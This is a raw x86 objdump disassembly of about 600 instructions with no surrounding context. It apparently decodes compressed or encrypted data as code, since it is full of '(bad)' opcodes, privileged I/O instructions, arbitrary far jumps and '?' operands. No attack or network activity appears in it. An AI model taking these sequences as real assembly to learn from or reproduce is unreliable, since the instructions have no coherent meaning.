  5388d3:	xor    DWORD PTR [edx-0x6d],edi
  5388d6:	out    dx,al
  5388d7:	jg     0x538861
  5388d9:	ret    0x173a
  5388dc:	sbb    DWORD PTR [eax+0x2a124ca],edi
  5388e2:	int3   
  5388e3:	rcr    BYTE PTR [ebx-0x79fa5af5],0x42
  5388ea:	cli    
  5388eb:	cld    
  5388ec:	and    ch,ch
  5388ee:	and    dh,BYTE PTR [edx-0x5b]
  5388f1:	popf   
  5388f2:	pusha  
  5388f3:	inc    ecx
  5388f4:	xor    ah,BYTE PTR [ebx]
  5388f6:	mov    ah,0x1c
  5388f8:	inc    esi
  5388f9:	cmp    ecx,DWORD PTR [eax-0x36]
  5388fc:	pop    edi
  5388fd:	stos   DWORD PTR es:[edi],eax
  5388fe:	xor    ch,BYTE PTR [esi+eax*4]
  538901:	lods   eax,DWORD PTR ds:[esi]
  538902:	cli    
  538903:	shl    BYTE PTR [edi-0x6f544465],cl
  538909:	jns    0x53897c
  53890b:	imul   ecx,DWORD PTR ds:0xc681e939,0x1
  538912:	outs   dx,DWORD PTR ds:[esi]
  538913:	mov    esp,0xa4f4bae
  538918:	(bad)  
  538919:	and    BYTE PTR [ebx],dh
  53891b:	lods   eax,DWORD PTR ds:[esi]
  53891c:	hlt    
  53891d:	xor    ecx,DWORD PTR [esi]
  53891f:	lods   eax,DWORD PTR ds:[esi]
  538920:	sbb    DWORD PTR [ebx-0x1],ebp
  538923:	push   es
  538924:	mov    ah,0x99
  538926:	pushf  
  538927:	or     BYTE PTR [edi+eax*8],ah
  53892a:	and    edx,DWORD PTR [edx-0x45d7637f]
  538930:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  538931:	add    DWORD PTR [edi],eax
  538933:	jmp    0xf963f610
  538938:	dec    edx
  538939:	xchg   esi,eax
  53893a:	lahf   
  53893b:	or     ah,al
  53893d:	imul   ecx,DWORD PTR [edx+ecx*2-0x73],0xffffff97
  538942:	aas    
  538943:	stos   DWORD PTR es:[edi],eax
  538944:	cmp    DWORD PTR [eax-0x32b95e17],eax
  53894a:	push   es
  53894b:	(bad)
  53894e:	mov    dh,dl
  538950:	sbb    DWORD PTR [ebx+0x7343df27],0x1c
  538957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  538958:	retf   
  538959:	jl     0x5388e3
  53895b:	rcl    BYTE PTR [edx],0x65
  53895e:	and    DWORD PTR [edx-0x44],ebp
  538961:	dec    ebx
  538962:	inc    edi
  538964:	and    dh,0xa0
  538967:	ret    
  538968:	stc    
  538969:	cmp    eax,0xe44ce3d0
  53896e:	ret    
  53896f:	ret    
  538970:	or     al,0xfc
  538972:	push   eax
  538973:	addr16 add eax,0x19bb887f
  538979:	repnz hlt 
  53897b:	mov    ah,0x3b
  53897d:	adc    ebx,esi
  53897f:	add    esi,eax
  538981:	out    0x79,eax
  538983:	dec    esp
  538984:	ror    ebp,1
  538986:	pop    edx
  538987:	cmp    eax,0x3459f407
  53898c:	je     0x5389c5
  53898e:	and    al,0xe3
  538990:	out    dx,al
  538991:	(bad)  
  538992:	push   esp
  538993:	xchg   ecx,eax
  538994:	xchg   esi,eax
  538995:	fimul  DWORD PTR [eax]
  538997:	and    eax,0x5c05bd08
  53899c:	loopne 0x538995
  53899e:	mov    al,0xd
  5389a0:	xor    DWORD PTR [ebp-0x12],eax
  5389a3:	push   es
  5389a4:	pushf  
  5389a5:	dec    ebx
  5389a6:	dec    esp
  5389a7:	pop    esp
  5389a8:	loopne 0x538934
  5389aa:	repz cmp eax,0xd9941f42
  5389b0:	sbb    eax,0x36b9085b
  5389b5:	(bad)  
  5389b6:	jmp    0x5212:0x7bf7cd4b
  5389bd:	(bad)  
  5389be:	jge    0x538940
  5389c0:	mov    WORD PTR [edi+0x4d],es
  5389c3:	xor    eax,0x3970c20c
  5389c8:	mov    ah,0x6f
  5389ca:	cmp    ebp,DWORD PTR [edx-0x7f4b2b0f]
  5389d0:	shl    DWORD PTR [edi-0x80],1
  5389d3:	clc    
  5389d4:	and    eax,0xbb4fdca0
  5389d9:	dec    edi
  5389da:	add    al,0x9
  5389dc:	inc    edi
  5389dd:	pushf  
  5389de:	and    ebp,esp
  5389e0:	xor    edx,DWORD PTR [edi]
  5389e2:	scas   eax,DWORD PTR es:[edi]
  5389e3:	jge    0x538a39
  5389e5:	inc    ebx
  5389e6:	sub    al,0xf1
  5389e8:	mov    ebp,0x8b041d49
  5389ed:	xchg   DWORD PTR [esi-0x7],eax
  5389f0:	test   esi,ecx
  5389f2:	fisttp WORD PTR [eax+0x58]
  5389f5:	xchg   ebp,eax
  5389f6:	imul   esi,DWORD PTR [ebx],0x299d2dd9
  5389fc:	push   ebx
  5389fd:	push   ss
  5389fe:	dec    ebx
  5389ff:	push   ecx
  538a00:	sbb    eax,0xb7c4ec35
  538a05:	loope  0x538a78
  538a07:	int    0x47
  538a09:	stos   DWORD PTR es:[edi],eax
  538a0a:	xchg   edx,eax
  538a0b:	adc    DWORD PTR [ecx+0x192b185e],edx
  538a11:	outs   dx,BYTE PTR ds:[esi]
  538a12:	mov    WORD PTR [ecx],?
  538a14:	cmp    edx,DWORD PTR [eax]
  538a16:	push   ss
  538a17:	js     0x5389b1
  538a19:	arpl   di,cx
  538a1b:	shl    BYTE PTR [ebx-0x40],cl
  538a1e:	dec    edx
  538a1f:	inc    ecx
  538a20:	xlat   BYTE PTR ds:[ebx]
  538a21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  538a22:	or     esp,esi
  538a24:	pop    edx
  538a25:	(bad)  
  538a26:	mov    dl,0x61
  538a28:	dec    ebx
  538a29:	sbb    edi,DWORD PTR [ebp+0x5a]
  538a2c:	mov    eax,ds:0xc7d98597
  538a31:	adc    BYTE PTR [esi-0x2e796fac],al
  538a37:	push   edi
  538a38:	(bad)  
  538a3a:	or     esp,DWORD PTR [ebp+0x12]
  538a3d:	inc    edx
  538a3e:	jb     0x5389dc
  538a40:	ret    
  538a41:	pop    edi
  538a42:	std    
  538a43:	adc    DWORD PTR [esi+edi*2+0x5da8111c],esi
  538a4a:	f2xm1  
  538a4c:	mov    cl,0xcd
  538a4e:	stc    
  538a4f:	sahf   
  538a50:	xchg   edx,eax
  538a51:	xor    ch,BYTE PTR [edi+ebp*2]
  538a54:	into   
  538a55:	mov    DWORD PTR [esi+0xa],esi
  538a58:	ins    BYTE PTR es:[edi],dx
  538a59:	adc    dh,ch
  538a5b:	inc    edi
  538a5c:	ds fwait
  538a5e:	test   eax,0xf94c5ebc
  538a63:	mov    dh,0xaf
  538a65:	dec    ecx
  538a66:	xchg   esi,eax
  538a67:	std    
  538a68:	pop    ebp
  538a69:	or     ebx,DWORD PTR [ebx]
  538a6b:	leave  
  538a6c:	and    DWORD PTR [ebx+0x3242e09c],esi
  538a72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  538a73:	pushf  
  538a74:	jg     0x538a8a
  538a76:	clc    
  538a77:	push   ds
  538a78:	call   0xc828:0xd4442ce4
  538a7f:	push   es
  538a80:	mov    eax,0x6c23a364
  538a85:	mov    esp,0x4425415d
  538a8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  538a8b:	xchg   ebx,eax
  538a8c:	in     eax,dx
  538a8d:	(bad)  
  538a8f:	out    dx,eax
  538a90:	dec    esp
  538a91:	ja     0x538a5a
  538a93:	and    BYTE PTR [esi+0x2b],0xf5
  538a97:	pop    ds
  538a98:	repz jns 0x538a3b
  538a9b:	in     eax,dx
  538a9c:	sbb    DWORD PTR [ebp+0x34fbe35e],ebx
  538aa2:	stc    
  538aa3:	je     0x538ab3
  538aa5:	aad    0xb4
  538aa7:	mov    al,ds:0x5c6b4f31
  538aac:	mov    eax,ds:0xea07e886
  538ab1:	push   0xffffffce
  538ab3:	sbb    ch,bh
  538ab5:	sbb    DWORD PTR [ecx+0x6e86a63c],ebp
  538abb:	cld    
  538abc:	xor    al,0xce
  538abe:	hlt    
  538abf:	pop    ecx
  538ac0:	dec    edi
  538ac1:	mov    cl,0xb1
  538ac3:	(bad)  
  538ac4:	mov    bl,0xa5
  538ac6:	mov    eax,0xd7cf9ad
  538acb:	ins    DWORD PTR es:[edi],dx
  538acc:	neg    DWORD PTR [ecx]
  538ace:	es jo  0x538ad2
  538ad1:	jmp    0x4dfdb1b1
  538ad6:	fisub  DWORD PTR [esi+0x1d7f3254]
  538adc:	pop    edx
  538add:	add    DWORD PTR [edx],ebp
  538adf:	fs fdivr st,st(1)
  538ae2:	pop    eax
  538ae3:	xor    eax,esi
  538ae5:	inc    esp
  538ae6:	jns    0x538b67
  538ae8:	dec    ebp
  538ae9:	lea    esi,cs:[ecx]
  538aec:	mov    ebp,ss
  538aee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  538aef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  538af0:	or     ebx,DWORD PTR [esi-0x7891fcb9]
  538af6:	or     esp,DWORD PTR [edi-0x4fd86b90]
  538afc:	cmp    ch,ch
  538afe:	inc    ecx
  538aff:	ja     0x538aee
  538b01:	dec    ebp
  538b02:	pop    ebx
  538b03:	push   edi
  538b04:	fadd   st,st(4)
  538b06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  538b07:	shr    DWORD PTR [edx],cl
  538b09:	leave  
  538b0a:	dec    ebx
  538b0b:	and    eax,0x4d15082c
  538b10:	adc    BYTE PTR [edi+esi*1+0x694a6115],0x5b
  538b18:	lock mov esi,DWORD PTR [ebx]
  538b1b:	push   edi
  538b1c:	inc    edi
  538b1d:	mov    al,ds:0xef1a5544
  538b22:	mov    ecx,0x504ed464
  538b27:	inc    edi
  538b28:	sbb    ah,BYTE PTR ds:0xcc62a5db
  538b2e:	and    bl,BYTE PTR [edx+ebp*4]
  538b31:	xlat   BYTE PTR es:[ebx]
  538b33:	dec    ecx
  538b34:	pushf  
  538b35:	das    
  538b36:	gs adc eax,0xc336fe5c
  538b3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  538b3d:	(bad)  
  538b3f:	jg     0x538b73
  538b41:	imul   si,WORD PTR [ebx+eax*8+0x65143f77],0x6f
  538b4a:	out    0x2f,eax
  538b4c:	les    eax,FWORD PTR [ecx-0x24]
  538b4f:	xor    eax,0xd8420caf
  538b54:	in     eax,0xc4
  538b56:	sub    DWORD PTR [ebx-0x4b34b6bc],ebx
  538b5c:	cmp    al,0xeb
  538b5e:	loop   0x538b8c
  538b60:	pop    ds
  538b61:	nop
  538b62:	scas   eax,DWORD PTR es:[edi]
  538b63:	push   esi
  538b64:	pop    ds
  538b65:	xor    al,BYTE PTR [eax+0x4b]
  538b68:	(bad)  
  538b6a:	and    eax,0xee56659f
  538b6f:	in     eax,dx
  538b70:	jmp    0x538ba4
  538b72:	jge    0x538b02
  538b74:	push   ecx
  538b75:	leave  
  538b76:	in     al,0x86
  538b78:	or     eax,0x95d3b59a
  538b7d:	sbb    ch,BYTE PTR [eax]
  538b7f:	idiv   bh
  538b81:	popf   
  538b82:	sub    eax,0x61d45100
  538b87:	xchg   esp,eax
  538b88:	push   ds
  538b89:	mov    bh,0x91
  538b8b:	mov    ch,0x94
  538b8d:	pop    eax
  538b8e:	(bad)  
  538b8f:	js     0x538b6e
  538b91:	xchg   ebx,eax
  538b92:	add    esp,esi
  538b94:	xor    DWORD PTR [esi],ebx
  538b96:	cmp    eax,0xb245b243
  538b9b:	sbb    ah,BYTE PTR [edi]
  538b9d:	shl    BYTE PTR [eax-0x40],cl
  538ba0:	jle    0x538b74
  538ba2:	sbb    cl,BYTE PTR [ebx-0x5c01ae71]
  538ba8:	cmp    ecx,eax
  538baa:	or     eax,0x4fc2161d
  538baf:	dec    ebx
  538bb0:	cmp    edi,DWORD PTR [edx+0x9ba98ec]
  538bb6:	fwait
  538bb7:	bound  ebx,QWORD PTR [ecx+edi*2]
  538bba:	mov    ebp,DWORD PTR [eax]
  538bbc:	mov    esp,0xda15416a
  538bc1:	mov    bh,0xc1
  538bc3:	add    eax,DWORD PTR [edx+ebx*8-0x35fec8f7]
  538bca:	fwait
  538bcb:	(bad)  
  538bcc:	into   
  538bcd:	jle    0x538c00
  538bcf:	pusha  
  538bd0:	fs in  eax,dx
  538bd2:	mul    DWORD PTR [edi-0x664f770c]
  538bd8:	xchg   edx,eax
  538bd9:	int3   
  538bda:	call   0x15f2e8e9
  538bdf:	out    dx,eax
  538be0:	xchg   esi,eax
  538be1:	mov    bl,BYTE PTR [esp+eax*4+0x5e9db819]
  538be8:	xor    eax,DWORD PTR [edx]
  538bea:	lods   al,BYTE PTR ds:[esi]
  538beb:	lea    edx,ds:0xa7e7ffaf
  538bf1:	dec    ebx
  538bf2:	cs stos BYTE PTR es:[edi],al
  538bf4:	pop    ebx
  538bf5:	xchg   ebx,eax
  538bf6:	adc    edx,DWORD PTR [ebp-0x71]
  538bf9:	loopne 0x538ba1
  538bfb:	dec    ebx
  538bfc:	sbb    eax,0xfbcca47c
  538c01:	mov    ds:0x34d9161a,al
  538c06:	loope  0x538bb6
  538c08:	imul   ecx,DWORD PTR [edx-0x63],0x86bfd111
  538c0f:	stos   BYTE PTR es:[edi],al
  538c10:	push   esp
  538c11:	jb     0x538bab
  538c13:	popf   
  538c14:	xchg   BYTE PTR [ecx-0x74],ch
  538c17:	jge    0x538c2e
  538c19:	cs jmp 0x538bc2
  538c1c:	sbb    eax,DWORD PTR [esi-0x20]
  538c1f:	cdq    
  538c20:	sub    DWORD PTR [ebx-0x379aea8b],ecx
  538c26:	(bad)  [ebx-0x39a728ad]
  538c2c:	out    0xf2,eax
  538c2e:	mov    ds:0x79b47920,al
  538c33:	add    eax,0x1640ecd9
  538c38:	call   0xf71ca0cc
  538c3d:	adc    esp,DWORD PTR gs:[ebp+0x5b8de27f]
  538c44:	fucomi st,st(2)
  538c46:	sub    dh,dl
  538c48:	fimul  DWORD PTR [ecx]
  538c4a:	push   eax
  538c4b:	out    dx,al
  538c4c:	mov    ?,eax
  538c4e:	test   al,0x6f
  538c50:	fs popf 
  538c52:	mov    ds:0x30a2982a,eax
  538c57:	popa   
  538c58:	inc    esi
  538c59:	mov    ah,0xb9
  538c5b:	mov    edx,DWORD PTR [esi+0x1c5ceb58]
  538c61:	mov    ss,WORD PTR [eax+0x3d]
  538c64:	inc    BYTE PTR [ebp+0x2b]
  538c67:	jle    0x538c7e
  538c69:	jno    0x538c71
  538c6b:	repz into 
  538c6d:	pop    esi
  538c6e:	aad    0x1e
  538c70:	ror    BYTE PTR [ecx+0x29],cl
  538c73:	mov    ah,0xbd
  538c75:	jne    0x538ca9
  538c77:	jge    0x538c62
  538c79:	stc    
  538c7a:	pop    es
  538c7b:	adc    BYTE PTR [ecx+0x10e8f71e],al
  538c81:	xchg   esp,eax
  538c82:	push   edx
  538c83:	fwait
  538c84:	hlt    
  538c85:	mov    bl,0xde
  538c87:	fdivr  st,st(5)
  538c89:	xchg   edx,eax
  538c8a:	loope  0x538c8a
  538c8c:	out    dx,al
  538c8d:	push   ebx
  538c8e:	nop
  538c8f:	test   DWORD PTR [edi-0x630294fa],eax
  538c95:	shr    DWORD PTR [eax-0x40],cl
  538c98:	xchg   BYTE PTR [esp+eax*2+0x17],ch
  538c9c:	hlt    
  538c9d:	add    esi,DWORD PTR [esi]
  538c9f:	cmp    bh,BYTE PTR [edx]
  538ca1:	lea    esp,[ecx+0x74241cf6]
  538ca7:	sbb    DWORD PTR [edx+ebp*4+0x3b],0xffffffa9
  538cac:	dec    eax
  538cad:	inc    edi
  538cae:	mov    ebx,0xb6b05a26
  538cb3:	pop    esp
  538cb4:	lods   eax,DWORD PTR ds:[esi]
  538cb5:	jbe    0x538d26
  538cb7:	test   al,0x7c
  538cb9:	push   ss
  538cba:	sbb    ecx,DWORD PTR [edi+0x6c]
  538cbd:	adc    DWORD PTR [edx+0x2fb02dce],eax
  538cc3:	cmp    bl,BYTE PTR [edi]
  538cc5:	aas    
  538cc6:	inc    edx
  538cc7:	fsub   DWORD PTR [esi]
  538cc9:	pop    es
  538cca:	shr    DWORD PTR [ebx+0x2d],1
  538ccd:	pop    eax
  538cce:	int    0x5d
  538cd0:	test   DWORD PTR [ecx],esi
  538cd2:	xchg   edi,eax
  538cd3:	mov    esp,ebx
  538cd5:	cmp    ecx,DWORD PTR [ecx+0xa4d3b92]
  538cdb:	xchg   ebx,eax
  538cdc:	cwde   
  538cdd:	push   DWORD PTR [ebx+ebx*1]
  538ce0:	scas   al,BYTE PTR es:[edi]
  538ce1:	bound  edx,QWORD PTR [eax*2+0x312ba3e1]
  538ce8:	adc    eax,0x9860f652
  538ced:	inc    ebx
  538cee:	sti    
  538cef:	sbb    bh,ch
  538cf1:	xchg   edi,eax
  538cf2:	dec    eax
  538cf3:	add    BYTE PTR [edx+esi*8+0x4a],bl
  538cf7:	add    ebp,DWORD PTR [esi]
  538cf9:	repz xchg ebp,eax
  538cfb:	or     ebp,DWORD PTR [esi]
  538cfd:	pop    eax
  538cfe:	int3   
  538cff:	stc    
  538d00:	arpl   WORD PTR [esp+edi*8-0x3b],dx
  538d04:	fiadd  WORD PTR [ebx-0x66]
  538d07:	popa   
  538d08:	lock mov es,WORD PTR [ecx-0x22]
  538d0c:	cmp    ch,BYTE PTR [esi-0xf]
  538d0f:	js     0x538cd0
  538d11:	inc    ebx
  538d12:	push   eax
  538d13:	loope  0x538d6f
  538d15:	popa   
  538d16:	out    0xf1,al
  538d18:	sahf   
  538d19:	lahf   
  538d1a:	sbb    DWORD PTR [esi+0x39cba89e],edi
  538d20:	xor    esi,edx
  538d22:	xchg   esi,eax
  538d23:	mov    al,0xd0
  538d25:	sub    bl,BYTE PTR [ecx-0x43]
  538d28:	dec    esi
  538d29:	out    dx,al
  538d2a:	xlat   BYTE PTR ds:[ebx]
  538d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  538d2c:	add    eax,0x30191a8c
  538d31:	cmp    DWORD PTR [ebp+0x45],esp
  538d34:	fsubr  DWORD PTR [edx-0x20]
  538d37:	loop   0x538d18
  538d39:	inc    ebx
  538d3a:	push   ecx
  538d3b:	xor    al,BYTE PTR [ecx-0x28]
  538d3e:	stos   DWORD PTR es:[edi],eax
  538d3f:	out    dx,eax
  538d40:	mov    ah,bl
  538d42:	xlat   BYTE PTR ds:[ebx]
  538d43:	push   es
  538d44:	nop
  538d45:	arpl   WORD PTR [edi],bx
  538d47:	and    al,0x11
  538d49:	aas    
  538d4a:	add    esp,DWORD PTR [edi-0x1570c509]
  538d50:	mov    ah,bl
  538d52:	jmp    0x538dc3
  538d54:	cwde   
  538d55:	mov    bl,0x3a
  538d57:	xor    al,0x6e
  538d59:	enter  0x4f7e,0xb2
  538d5d:	mov    esi,0x8b2eed80
  538d62:	pop    eax
  538d63:	add    BYTE PTR [ecx+edi*1],bh
  538d66:	inc    edi
  538d67:	xchg   esp,esp
  538d69:	mov    esi,0x1a8b5c81
  538d6e:	jle    0x538cfa
  538d70:	into   
  538d71:	ds mov eax,0xdd8d7898
  538d77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  538d78:	adc    al,0x6d
  538d7a:	and    BYTE PTR [eax],dh
  538d7c:	ja     0x538d17
  538d7e:	hlt    
  538d7f:	mov    ebp,DWORD PTR [esi+0x7a]
  538d82:	aam    0xc7
  538d84:	add    al,0x60
  538d86:	into   
  538d87:	aas    
  538d88:	ret    
  538d89:	shl    DWORD PTR [ecx+0x6e94f0a0],1
  538d8f:	ror    BYTE PTR gs:[edx-0x553dca13],1
  538d96:	arpl   WORD PTR [ebx+0xb3ec6b],ax
  538d9c:	shufps xmm1,xmm7,0x4c
  538da0:	cmp    al,0x37
  538da2:	mov    ebp,0xce325930
  538da7:	mov    dl,0xbb
  538da9:	icebp  
  538daa:	sbb    BYTE PTR [ebx-0x2],bh
  538dad:	inc    esi
  538dae:	xchg   DWORD PTR [edi-0x6cece19c],ecx
  538db4:	adc    eax,0xb1909514
  538db9:	jnp    0x538d61
  538dbb:	ret    0xe7b6
  538dbe:	xchg   esp,eax
  538dbf:	lock repnz lds esi,FWORD PTR [edi-0x6b7b9dc3]
  538dc7:	mov    ebp,ebx
  538dc9:	xor    bl,dl
  538dcb:	mov    cl,0x73
  538dcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  538dce:	int3   
  538dcf:	mulps  xmm5,XMMWORD PTR [esi+0x4b]
  538dd3:	fsin   
  538dd5:	add    DWORD PTR [esi-0x3],eax
  538dd8:	sub    BYTE PTR [ebx-0xbde5596],cl
  538dde:	test   al,0xdc
  538de1:	repnz dec ecx
  538de3:	fcomp  QWORD PTR [esp+ebp*2-0x1d77e915]
  538dea:	retf   0xf2a2
  538ded:	dec    esp
  538dee:	dec    esp
  538def:	leave  
  538df0:	idiv   BYTE PTR [ecx+0x73a24aa6]
  538df6:	popa   
  538df7:	xor    ah,dh
  538df9:	add    ebp,esp
  538dfb:	inc    esp
  538dfc:	fiadd  DWORD PTR [eax-0x7b]
  538dff:	dec    ebp
  538e00:	in     eax,0xdc
  538e02:	test   eax,0xd4e331eb
  538e07:	mul    DWORD PTR [edi-0x55]
  538e0a:	in     al,dx
  538e0b:	fwait
  538e0c:	jg     0x538df3
  538e0e:	bnd jp 0x538dfb
  538e11:	leave  
  538e12:	aas    
  538e13:	and    eax,DWORD PTR [edx+0x61]
  538e16:	adc    al,0x45
  538e18:	dec    ecx
  538e19:	imul   esi,DWORD PTR [ebp+ecx*2+0x44590d8a],0x50
  538e21:	fnstenv [ecx]
  538e23:	fsubp  st(7),st
  538e25:	sub    DWORD PTR [eax],eax
  538e27:	inc    ebp
  538e28:	mov    esp,0xf1a2b0df
  538e2d:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  538e2f:	out    dx,al
  538e30:	jmp    0x538ea8
  538e32:	pop    ds
  538e33:	inc    ebx
  538e34:	jne    0x538e92
  538e36:	shl    DWORD PTR [ebp-0x14de535f],1
  538e3c:	mov    dh,0xd6
  538e3e:	test   DWORD PTR [esi+0x107be177],eax
  538e44:	add    DWORD PTR [esi+0x70],0xfffffff7
  538e48:	inc    ecx
  538e49:	int3   
  538e4a:	clc    
  538e4b:	sub    dh,BYTE PTR [edi+ebx*1+0x7a]
  538e4f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  538e51:	jg     0x538e11
  538e53:	fwait
  538e54:	jmp    0x4738:0xd8e65dd
  538e5b:	lahf   
  538e5c:	jmp    0x8315:0xc6c62291
  538e63:	nop
  538e64:	cmp    DWORD PTR [edx],esp
  538e66:	push   ebp
  538e67:	repnz cwde 
  538e69:	dec    ecx
  538e6a:	mov    bl,0x19
  538e6c:	mov    eax,0xbf1c1128
  538e71:	addps  xmm2,xmm5
  538e74:	ret    0xcafe
  538e77:	inc    eax
  538e78:	aaa    
  538e79:	jg     0x538ea4
  538e7b:	leave  
  538e7c:	fs add ch,dl
  538e7f:	adc    eax,0x8cde4b24
  538e84:	bound  ebp,QWORD PTR [ebx]
  538e86:	pop    es
  538e87:	xor    DWORD PTR [esp+eax*1-0x447f5d77],edi
  538e8e:	sub    DWORD PTR [ebp-0x18ae2e40],0x70
  538e95:	mov    ch,BYTE PTR ds:0x2b2c86a5
  538e9b:	add    eax,0xdba09c8a
  538ea0:	(bad)  
  538ea1:	loopne 0x538ec7
  538ea3:	add    DWORD PTR [edi],0xffffff82
  538ea6:	nop
  538ea7:	xchg   ecx,eax
  538ea8:	loop   0x538f19
  538eaa:	dec    eax
  538eab:	sbb    al,0xeb
  538ead:	sub    BYTE PTR [edi],bh
  538eaf:	retf   
  538eb0:	push   ebx
  538eb1:	sub    eax,0x1cc9e23c
  538eb6:	dec    ebp
  538eb7:	cdq    
  538eb8:	call   0x53ae8a4e
  538ebd:	mov    ds:0x8124b225,eax
  538ec2:	jge    0x538ecc
  538ec4:	cmc    
  538ec5:	xchg   BYTE PTR [esi-0x26],dh
  538ec8:	jo     0x538f21
  538eca:	dec    edx
  538ecb:	push   edi
  538ecc:	xor    DWORD PTR [edi-0x36],eax
  538ecf:	dec    ebp
  538ed0:	lods   eax,DWORD PTR ds:[esi]
  538ed1:	aam    0xfd
  538ed3:	pusha  
  538ed4:	fwait
  538ed5:	pop    es
  538ed6:	jecxz  0x538e9e
  538ed8:	add    BYTE PTR [edx+0x55c03c6d],ch
  538ede:	stc    
  538edf:	in     eax,0x10
  538ee1:	ins    BYTE PTR es:[edi],dx
  538ee2:	imul   eax,DWORD PTR [eax],0xffffffa8
  538ee5:	and    esp,ebx
  538ee7:	sbb    BYTE PTR [esi+0x1d],bl
  538eea:	iret   
  538eeb:	ret    
  538eec:	mov    dl,0xae
  538eee:	test   DWORD PTR ds:0x1e577248,ebp
  538ef4:	add    al,0xcf
  538ef6:	js     0x538e82
  538ef8:	mov    al,0xc6
  538efa:	push   es
  538efb:	es jge 0x538eb4
  538efe:	aam    0x94
  538f00:	mov    bh,0xca
  538f02:	pop    ebx
  538f03:	xchg   BYTE PTR [ebp+0x4a],al
  538f06:	mov    esi,0x10e926ec
  538f0b:	jbe    0x538ee8
  538f0d:	mov    dh,0x2
  538f0f:	jmp    0xc985:0x1fbd2dd5
  538f16:	mov    ecx,0x5a2047ab
  538f1b:	jo     0x538f1a
  538f1d:	retf   
  538f1e:	adc    al,0xec
  538f20:	push   esp
  538f21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  538f22:	push   ebx
  538f23:	xor    ecx,DWORD PTR [ecx-0x55]
  538f26:	cmc    
  538f27:	out    dx,eax
  538f28:	mov    DWORD PTR [ebx+edi*1],eax
  538f2b:	push   ds
  538f2c:	fld    QWORD PTR [edi-0xa8a33fd]
  538f32:	loope  0x538faf
  538f34:	or     DWORD PTR [edi],eax
  538f36:	fadd   st,st(1)
  538f38:	inc    eax
  538f39:	inc    esp
  538f3a:	or     ah,BYTE PTR [ecx-0x3c7c4390]
  538f40:	mov    bh,0x59
  538f42:	iret   
  538f43:	xor    al,0xed
  538f45:	xchg   edx,eax
  538f46:	jae    0x538f3d
  538f48:	jecxz  0x538f90
  538f4a:	push   eax
  538f4b:	test   al,0xb4
  538f4d:	inc    edi
  538f4e:	inc    ecx
  538f4f:	dec    edx
  538f50:	bound  esp,QWORD PTR [ebx]
  538f52:	pop    ecx
  538f53:	stc    
  538f54:	cmp    ebp,DWORD PTR [ebx+0x5252e8f2]
  538f5a:	mov    eax,ds:0xd5a6a627
  538f5f:	faddp  st(1),st
  538f61:	ds add ecx,esp
  538f64:	xor    DWORD PTR [ebx-0x6c],ebx
  538f67:	push   ecx
  538f68:	sub    BYTE PTR [ecx+0x204aad51],ah
  538f6e:	int    0x66
  538f70:	test   al,0xfe
  538f72:	cs (bad) 
  538f74:	fidiv  DWORD PTR [eax+0x1ca0b5bc]
  538f7a:	lods   al,BYTE PTR ds:[esi]
  538f7b:	add    eax,ecx
  538f7d:	pusha  
  538f7e:	rcr    DWORD PTR [ebx],1
  538f80:	inc    edx
  538f81:	scas   eax,DWORD PTR es:[edi]
  538f82:	rcl    DWORD PTR [ebx+0xd],0xa9
  538f86:	rcl    BYTE PTR [esi+0x2c8ae414],1
  538f8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  538f8d:	ins    BYTE PTR es:[edi],dx
  538f8e:	loope  0x538f5b
  538f90:	js     0x538f1d
  538f92:	ja     0x538fa9
  538f94:	xor    al,0x63
  538f96:	fisubr WORD PTR [ebx]
  538f98:	call   0x72b33cb9
  538f9d:	rcl    BYTE PTR [edi],cl
  538f9f:	(bad)  
  538fa0:	in     al,0x4
  538fa2:	or     ch,BYTE PTR ds:0x4629606c
  538fa8:	mov    eax,0x7925c44f
  538fad:	stos   DWORD PTR es:[edi],eax
  538fae:	pusha  
  538faf:	sahf   
  538fb0:	jecxz  0x538fc8
  538fb2:	jp     0x538fa1
  538fb4:	fcom   st(0)
  538fb6:	loope  0x538f59
  538fb8:	stos   BYTE PTR es:[edi],al
  538fb9:	mov    al,ds:0xad3e5dfe
  538fbe:	imul   edx,DWORD PTR [edi-0x4a3685ee],0xffffff86
  538fc5:	lods   al,BYTE PTR ss:[esi]
  538fc7:	call   0xd803:0xce340056
  538fce:	and    eax,0x30dc6a39
  538fd3:	push   ebp
  538fd4:	sbb    BYTE PTR [esi],al
  538fd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  538fd7:	aas    
  538fd8:	mov    WORD PTR [ecx],?
  538fda:	addr16 adc eax,0x5e8783bd
  538fe0:	xor    bl,BYTE PTR [esi+0x4ecba3a8]
  538fe6:	jnp    0x538fd3
  538fe8:	ror    DWORD PTR [edi],0xed
  538feb:	mov    WORD PTR [eax],ss
  538fed:	sub    dh,BYTE PTR [ebx]
  538fef:	or     al,0x23
  538ff1:	mov    esp,0x20eddc1c
  538ff6:	mov    eax,ds:0xcff88fdb
  538ffb:	jg     0x53906e
  538ffd:	inc    ebx
  538ffe:	jecxz  0x538fd4
  539000:	sub    ah,BYTE PTR [ebx-0x71]
  539003:	push   ebp
  539004:	outs   dx,BYTE PTR ds:[esi]
  539005:	push   eax
  539006:	leave  
  539007:	jl     0x538f9e
  539009:	fs fs fcomp st(0)
  53900d:	add    edi,DWORD PTR [edi+eax*2+0xf]
  539011:	out    dx,al
  539012:	mov    cl,0x2f
  539014:	push   es
  539015:	lods   al,BYTE PTR ds:[esi]
  539016:	bound  eax,QWORD PTR [ecx]
  539018:	sub    eax,0xc96879a1
  53901d:	shr    BYTE PTR ss:[ebx],1
  539020:	sbb    al,0x4e
  539022:	or     al,0xe2
  539024:	call   DWORD PTR [ebx-0x322dba0b]
  53902a:	ficomp WORD PTR [ecx+0x5775088]
